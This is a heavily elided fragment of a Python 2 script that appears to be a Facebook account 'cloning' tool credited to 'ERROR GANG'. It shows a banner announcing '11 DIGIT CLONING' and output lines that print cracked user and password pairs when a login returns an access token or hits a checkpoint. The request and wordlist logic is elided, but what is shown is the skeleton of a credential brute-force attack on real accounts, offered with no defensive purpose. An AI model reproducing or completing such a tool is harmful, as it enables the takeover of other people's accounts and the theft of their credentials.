...
psb('\x1b[1;32m p 11 DIGIT CLONING START PLEASE WAIT ..........')
...
logo =  ___  ______ _____  _____   ____  _____     _____  ____  _    _ ______ _      
 ...
 |______|_|  \_|_|  \_\\____/|_|  \_\ |_____/ \____/|_|  |_|______|______|
...
def menu():
    ...
    print 'AUTHOR   : ERROR GANG'

    print 'FACEBOOK : WWW.FACEBOOK.COM/ERROR.SOHEL69'

    print 'GITHUB     : github.com/MUNTASIRMITHU69'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[ERROR GANG-OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                ...
                print '\x1b[1;93m[ERROR GANG-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 03 Days]\x1b[0m \n'
